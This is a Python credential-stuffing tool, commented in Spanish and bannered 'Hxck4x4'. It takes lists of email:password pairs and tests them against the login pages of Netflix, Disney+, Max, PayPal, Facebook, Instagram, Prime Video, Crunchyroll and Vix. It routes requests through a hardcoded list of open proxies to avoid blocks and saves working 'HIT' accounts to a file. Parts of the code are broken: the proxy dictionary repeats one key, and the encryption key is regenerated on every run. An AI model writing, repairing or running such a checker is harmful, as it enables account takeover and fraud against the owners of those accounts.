import requests
import os
import time
import re
import logging
import pyfiglet
import random
from colorama import Fore, Style, init
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor
from cryptography.fernet import Fernet



# Configuración de logs
logging.basicConfig(filename='checker_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# Clave para cifrado y descifrado de contraseñas
KEY = Fernet.generate_key()
cipher = Fernet(KEY)

# Funciones de diseño visual
def print_green(text): print("\033[92m{}\033[00m".format(text))
def print_red(text): print("\033[91m{}\033[00m".format(text))
def print_yellow(text): print("\033[93m{}\033[00m".format(text))
def print_cyan(text): print("\033[96m{}\033[00m".format(text))
def print_separator(): print("\033[90m" + "="*40 + "\033[00m")

# Función para validar formato de email
def is_valid_email(email):
    pattern = r'^[\w\.-]+@[\w\.-]+\.\w+$'
    return re.match(pattern, email)

# Cifrar y descifrar contraseñas
def encrypt_password(password):
    return cipher.encrypt(password.encode()).decode()

def decrypt_password(encrypted_password):
    return cipher.decrypt(encrypted_password.encode()).decode()

# Función para agregar cuentas al archivo 'accounts.txt' desde entrada manual
def add_accounts_manually(filename):
    print_cyan("\nIntroduce las cuentas en formato email:password. Escribe 'salir' para terminar.\n")
    with open(filename, 'a') as f:
        while True:
            account = input("Cuenta (email:password): ")
            if account.lower() == 'salir':
                break
            if ':' in account:
                email, password = account.split(':')
                if is_valid_email(email):
                    encrypted_password = encrypt_password(password)
                    f.write(f"{email}:{encrypted_password}\n")
                    print_green(f"Cuenta añadida: {email}")
                else:
                    print_red(f"Email inválido: {email}")
            else:
                print_red("Formato incorrecto. Debe ser email:password")

# Función para agregar cuentas desde otro archivo
def add_accounts_from_file(input_filename, output_filename):
    """
    Lee cuentas desde un archivo y las agrega al archivo 'accounts.txt' encriptando las contraseñas.
    """
    if not os.path.exists(input_filename):
        print_red(f"El archivo {input_filename} no existe.")
        return
    
    print_cyan(f"Leyendo cuentas desde {input_filename}...")
    
    with open(input_filename, 'r') as input_file, open(output_filename, 'a') as output_file:
        for line in tqdm(input_file, desc="Agregando cuentas", ncols=100):
            line = line.strip()
            if ':' in line:
                email, password = line.split(':')
                if is_valid_email(email):
                    encrypted_password = encrypt_password(password)
                    output_file.write(f"{email}:{encrypted_password}\n")
                else:
                    print_red(f"Email inválido: {email}")
                    logging.info(f"Email inválido: {email}")
            else:
                print_red(f"Formato incorrecto: {line}")
                logging.info(f"Formato incorrecto: {line}")

    print_green(f"Todas las cuentas se han añadido a {output_filename}.")

# Función para chequear las cuentas con exponential backoff
def check_account(session, email, password, url, headers=None, proxies=None, timeout=10, retries=3):
    for attempt in range(retries):
        try:
            payload = {'email': email, 'password': password}
            response = session.post(url, data=payload, headers=headers, proxies=proxies, timeout=timeout)

            if response.status_code == 200 and "success" in response.text:
                return True
            elif response.status_code != 200:
                print(f"Error en la solicitud: {response.status_code}")
            return False
        except requests.exceptions.RequestException as e:
            wait_time = 2 ** attempt  # Exponential backoff
            print(f"Error al realizar la solicitud: {e} (Intento {attempt + 1} de {retries}). Esperando {wait_time} segundos.")
            time.sleep(wait_time)
    return False

def read_accounts_from_file(filename):
    if not os.path.exists(filename):
        print(f"El archivo {filename} no existe. Creando archivo vacío.")
        open(filename, 'w').close()
        return []
    accounts = []
    with open(filename, 'r') as f:
        for line in f:
            try:
                email, encrypted_password = line.strip().split(':')
                password = decrypt_password(encrypted_password)
                if is_valid_email(email):
                    accounts.append((email, password))
                else:
                    print(f"Email inválido: {email}")
                    logging.info(f"Email inválido: {email}")
            except ValueError:
                print(f"Formato incorrecto en la línea: {line.strip()}")
                logging.info(f"Formato incorrecto en la línea: {line.strip()}")
    return accounts

def write_valid_accounts_to_file(filename, accounts):
    with open(filename, 'w') as f:
        for email, password in accounts:
            encrypted_password = encrypt_password(password)
            f.write(f"{email}:{encrypted_password}\n")

# Función para manejar proxies dinámicos
def get_proxies():
    return {
"http": "http://156.249.137.157:3128",
"http": "http://156.249.137.157:3128",
"http": "http://104.207.35.9:3128",
"http": "http://104.207.35.9:3128",
"http": "http://156.233.93.70:3128",
"http": "http://156.233.93.70:3128",
"http": "http://156.249.138.166:3128",
"http": "http://156.249.138.166:3128",
"http": "http://156.253.176.250:3128",
"http": "http://156.253.176.250:3128",
"http": "http://156.240.99.240:3128",
"http": "http://156.240.99.240:3128",
"http": "http://156.228.83.46:3128",
"http": "http://156.228.83.46:3128",
"http": "http://104.207.45.86:3128",
"http": "http://104.207.45.86:3128",
"http": "http://154.213.196.233:3128",
"http": "http://154.213.196.233:3128",
"http": "http://156.233.88.187:3128",
"http": "http://156.233.88.187:3128",
"http": "http://156.233.75.28:3128",
"http": "http://156.233.75.28:3128",
"http": "http://156.228.87.71:3128",
"http": "http://156.228.87.71:3128",
"http": "http://154.94.14.54:3128",
"http": "http://154.94.14.54:3128",
"http": "http://156.228.82.252:3128",
"http": "http://156.228.82.252:3128",
"http": "http://156.228.103.69:3128",
"http": "http://156.228.103.69:3128",
"http": "http://156.233.85.219:3128",
"http": "http://156.233.85.219:3128",
"http": "http://156.228.114.199:3128",
"http": "http://156.228.114.199:3128",
"http": "http://104.207.35.117:3128",
"http": "http://104.207.35.117:3128",
"http": "http://104.207.53.211:3128",
"http": "http://104.207.53.211:3128",
"http": "http://154.94.12.97:3128",
"http": "http://154.94.12.97:3128",
"http": "http://156.249.137.119:3128",
"http": "http://156.249.137.119:3128",
"http": "http://156.228.177.248:3128",
"http": "http://156.228.177.248:3128",
"http": "http://156.253.174.88:3128",
"http": "http://156.253.174.88:3128",
"http": "http://156.233.84.199:3128",
"http": "http://156.233.84.199:3128",
"http": "http://156.253.171.3:3128",
"http": "http://156.253.171.3:3128",
"http": "http://104.207.39.98:3128",
"http": "http://104.207.39.98:3128",
"http": "http://156.228.87.207:3128",
"http": "http://156.228.87.207:3128",
"http": "http://104.207.46.65:3128",
"http": "http://104.207.46.65:3128",
"http": "http://45.202.78.85:3128",
"http": "http://45.202.78.85:3128",
"http": "http://156.240.99.199:3128",
"http": "http://156.240.99.199:3128",
"http": "http://156.249.137.50:3128",
"http": "http://156.249.137.50:3128",
"http": "http://156.228.96.197:3128",
"http": "http://156.228.96.197:3128",
"http": "http://156.228.100.113:3128",
"http": "http://156.228.100.113:3128",
"http": "http://104.207.41.0:3128",
"http": "http://104.207.41.0:3128",
"http": "http://104.207.53.29:3128",
"http": "http://104.207.53.29:3128",
"http": "http://156.233.89.87:3128",
"http": "http://156.233.89.87:3128",
"http": "http://156.228.180.56:3128",
"http": "http://156.228.180.56:3128",
"http": "http://45.202.77.87:3128",
"http": "http://45.202.77.87:3128",
"http": "http://156.253.171.7:3128",
"http": "http://156.253.171.7:3128",
"http": "http://156.228.98.86:3128",
"http": "http://156.228.98.86:3128",
"http": "http://154.94.12.49:3128",
"http": "http://154.94.12.49:3128",
"http": "http://154.213.193.202:3128",
"http": "http://154.213.193.202:3128",
"http": "http://156.228.98.79:3128",
"http": "http://156.228.98.79:3128",
"http": "http://104.207.40.243:3128",
"http": "http://104.207.40.243:3128",
"http": "http://156.228.113.115:3128",
"http": "http://156.228.113.115:3128",
"http": "http://104.207.36.166:3128",
"http": "http://104.207.36.166:3128",
"http": "http://156.228.92.166:3128",
"http": "http://156.228.92.166:3128",
"http": "http://156.240.99.149:3128",
"http": "http://156.240.99.149:3128",
"http": "http://104.167.27.97:3128",
"http": "http://104.167.27.97:3128",
"http": "http://156.228.83.74:3128",
"http": "http://156.228.83.74:3128",
"http": "http://156.228.93.173:3128",
"http": "http://156.228.93.173:3128",
"http": "http://45.202.79.86:3128",
"http": "http://45.202.79.86:3128",
"http": "http://156.228.90.92:3128",
"http": "http://156.228.90.92:3128",
"http": "http://156.228.97.219:3128",
"http": "http://156.228.97.219:3128",
"http": "http://156.228.183.9:3128",
"http": "http://156.228.183.9:3128",
"http": "http://156.253.165.177:3128",
"http": "http://156.253.165.177:3128",
"http": "http://156.228.185.222:3128",
"http": "http://156.228.185.222:3128",
"http": "http://156.228.118.19:3128",
"http": "http://156.228.118.19:3128",
"http": "http://104.207.40.170:3128",
"http": "http://104.207.40.170:3128",
"http": "http://156.233.73.131:3128",
"http": "http://156.233.73.131:3128",
"http": "http://156.253.166.17:3128",
"http": "http://156.253.166.17:3128",
"http": "http://104.207.37.61:3128",
"http": "http://104.207.37.61:3128",
"http": "http://104.207.46.63:3128",
"http": "http://104.207.46.63:3128",
"http": "http://104.207.54.188:3128",
"http": "http://104.207.54.188:3128",
"http": "http://156.228.97.1:3128",
"http": "http://156.228.97.1:3128",
"http": "http://156.228.183.253:3128",
"http": "http://156.228.183.253:3128",
"http": "http://45.202.78.110:3128",
"http": "http://45.202.78.110:3128",
"http": "http://154.213.195.35:3128",
"http": "http://154.213.195.35:3128",
"http": "http://156.253.169.157:3128",
"http": "http://156.253.169.157:3128",
"http": "http://156.233.75.135:3128",
"http": "http://156.233.75.135:3128",
"http": "http://156.228.119.28:3128",
"http": "http://156.228.119.28:3128",
"http": "http://156.228.184.108:3128",
"http": "http://156.228.184.108:3128",
"http": "http://156.228.174.101:3128",
"http": "http://156.228.174.101:3128",
"http": "http://156.228.104.128:3128",
"http": "http://156.228.104.128:3128",
"http": "http://156.228.184.84:3128",
"http": "http://156.228.184.84:3128",
"http": "http://104.207.62.198:3128",
"http": "http://104.207.62.198:3128",
"http": "http://104.207.57.151:3128",
"http": "http://104.207.57.151:3128",
"http": "http://156.233.91.215:3128",
"http": "http://156.233.91.215:3128",
"http": "http://156.228.174.14:3128",
"http": "http://156.228.174.14:3128",
"http": "http://156.228.111.104:3128",
"http": "http://156.228.111.104:3128",
"http": "http://104.207.55.122:3128",
"http": "http://104.207.55.122:3128",
"http": "http://156.228.181.158:3128",
"http": "http://156.228.181.158:3128",
"http": "http://104.207.43.224:3128",
"http": "http://104.207.43.224:3128",
"http": "http://104.167.24.75:3128",
"http": "http://104.167.24.75:3128",
"http": "http://104.207.47.156:3128",
"http": "http://104.207.47.156:3128",
"http": "http://154.213.196.137:3128",
"http": "http://154.213.196.137:3128",
"http": "http://156.228.185.122:3128",
"http": "http://156.228.185.122:3128",
"http": "http://156.253.164.79:3128",
"http": "http://156.253.164.79:3128",
"http": "http://154.213.204.237:3128",
"http": "http://154.213.204.237:3128",
"http": "http://156.233.87.207:3128",
"http": "http://156.233.87.207:3128",
"http": "http://156.228.180.48:3128",
"http": "http://156.228.180.48:3128",
"http": "http://156.228.91.255:3128",
"http": "http://156.228.91.255:3128",
"http": "http://104.207.52.30:3128",
"http": "http://104.207.52.30:3128",
"http": "http://156.228.176.137:3128",
"http": "http://156.228.176.137:3128",
"http": "http://156.233.84.10:3128",
"http": "http://156.233.84.10:3128",
"http": "http://156.228.81.6:3128",
"http": "http://156.228.81.6:3128",
"http": "http://104.207.39.52:3128",
"http": "http://104.207.39.52:3128",
"http": "http://156.228.105.62:3128",
"http": "http://156.228.105.62:3128",
"http": "http://156.253.173.78:3128",
"http": "http://156.253.173.78:3128",
"http": "http://156.233.74.12:3128",
"http": "http://156.233.74.12:3128"
    }

# Verificación de cuentas usando multithreading
def check_accounts():
    accounts_file = 'accounts.txt'
    valid_accounts_file = 'valid_accounts.txt'
    urls = {
        'Crunchyroll': 'https://sso.crunchyroll.com/es/authorize?client_id=noaihdevm_6iyg0a8l0q&redirect_uri=https%3A%2F%2Fwww.crunchyroll.com%2Fcallback&response_type=cookie&state=%2F',
        'Disney': 'https://disneyplus.com/login',
        'Max': 'https://auth.max.com/login?redirectTo=%2Fsettings',
        'Paypal': 'https://paypal.com/signin',
        'Facebook': 'https://m.facebook.com',
        'Instagram': 'https://www.instagram.com/accounts/login/?next=%2Fusers%2Fself&source=mobile_nav',
        'Netflix': 'https://netflix.com/login',
        'Prime': 'https://www.amazon.com.mx/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fna.primevideo.com%2Fauth%2Freturn%2Fref%3Dav_auth_ap%3F_t%3D1sgxoAyVFnFL2F-Ey9-SUGkxc1KIJiKHOEqgidm8iIKincAAAAAQAAAABnEfBlcmF3AAAAAPgWC9WfHH8iB-olH_E9xQ%26location%3Dhttps%3A%2F%2Fwww.primevideo.com%2Fsignup%3Fref_%253Ddvm_MLP_MX_Join_1&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&accountStatusPolicy=P1&openid.assoc_handle=amzn_prime_video_sso_mx&openid.mode=checkid_setup&countryCode=MX&siteState=133-3527868-5675908&language=es_ES&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0',
        'Vix': 'https://vix.com/es-es/iniciar-sesion?lang=iniciar-sesion',
        
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    session = requests.Session()
    accounts = read_accounts_from_file(accounts_file)
    valid_accounts = []
    hit_count = 0
    error_count = 0

    print_cyan("\nPlataformas disponibles:")
    for key in urls:
        print(f"- {key}")
    platform = input("Selecciona la plataforma para verificar cuentas:  ")
    url = urls.get(platform)

    if not url:
        print_red("Plataforma no válida. Selecciona una de las opciones disponibles.")
        return

    proxies = get_proxies()

    def process_account(account):
        nonlocal hit_count, error_count
        email, password = account
        account_str = f"{email}:{password}"
        print_separator()
        print_yellow(f"Chequeando cuenta en {platform}: {account_str}")
        
        if check_account(session, email, password, url, headers=headers, proxies=proxies):
            valid_accounts.append((email, password))
            print_green( f"\n¡HIT! Cuenta válida: {account_str}")
            logging.info(f"HIT: {account_str}")
            hit_count += 1
        else:
            print_red(f"\nERROR: Cuenta inválida: {account_str}")
            logging.info(f"ERROR: {account_str}")
            error_count += 1
        time.sleep(1)  # Evitar bloqueos

    # Multithreading para mejorar la velocidad de verificación
    with ThreadPoolExecutor(max_workers=5) as executor:
        list(tqdm(executor.map(process_account, accounts), desc="Verificando cuentas", ncols=100))

    write_valid_accounts_to_file(valid_accounts_file, valid_accounts)

    print_separator()
    print_cyan(f"Proceso completado. Total de cuentas verificadas: {len(accounts)}")
    print_green(f"HIT (Cuentas válidas): {hit_count}")
    print_red(f"ERROR (Cuentas inválidas): {error_count}")
    print_green(f"Revisa '{valid_accounts_file}' para ver las cuentas válidas.")
    print_separator()

# Función para visualizar cuentas válidas
def view_valid_accounts():
    valid_accounts_file = 'valid_accounts.txt'
    if not os.path.exists(valid_accounts_file):
        print_red(f"El archivo {valid_accounts_file} no existe.")
        return

    print_cyan(f"\nCuentas validadas ({valid_accounts_file}):")
    with open(valid_accounts_file, 'r') as f:
        for line in f:
            print_green(line.strip())

# Menú principal
def menu():
    while True:
        print_separator()
        print_cyan("Menú de opciones:")
        print_yellow("1. Comenzar a chequear cuentas")
        print_yellow("2. Agregar cuentas manualmente")
        print_yellow("3. Agregar cuentas desde un archivo")
        print_yellow("4. Ver cuentas válidas")
        print_yellow("5. Reiniciar el código")
        print_yellow("6. Salir")
        
        option = input("Selecciona una opción (1-6): ")
        
        if option == '1':
            check_accounts()
        elif option == '2':
            add_accounts_manually('accounts.txt')
        elif option == '3':
            input_file = input("Introduce el nombre del archivo desde el cual agregar cuentas (o ruta completa): ")
            add_accounts_from_file(input_file, 'accounts.txt')
        elif option == '4':
            view_valid_accounts()
        elif option == '5':
            print_cyan("Reiniciando el código...")
        elif option == '6':
            print_yellow("Saliendo del programa. ¡Hasta luego!")
            if os.path.exists("accounts.txt"):
                os.remove("accounts.txt")
            break
        else:
            print_red("Opción no válida. Por favor, selecciona una opción entre 1 y 6.")
# Inicializa Colorama
init(autoreset=True)

def clear_screen():
    # Comando para limpiar la pantalla según el sistema operativo
    os.system('cls' if os.name == 'nt' else 'clear')

def imprimir_texto_ascii_coloreado():
    # Crear un texto en ASCII con pyfiglet
    ascii_art = pyfiglet.figlet_format("Hxck4x4", font="banner")
    # Separar las líneas del arte ASCII
    lines = ascii_art.splitlines()
    
    # Colores disponibles
    colores = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA]

    # Imprimir cada línea en un color aleatorio
    for line in lines:
        print(random.choice(colores) + line)

if __name__ == "__main__":
    clear_screen()  # Limpiar la pantalla
    imprimir_texto_ascii_coloreado()  # Imprimir el texto ASCII coloreado
# Ejecutar el menú
if __name__ == "__main__":
    menu()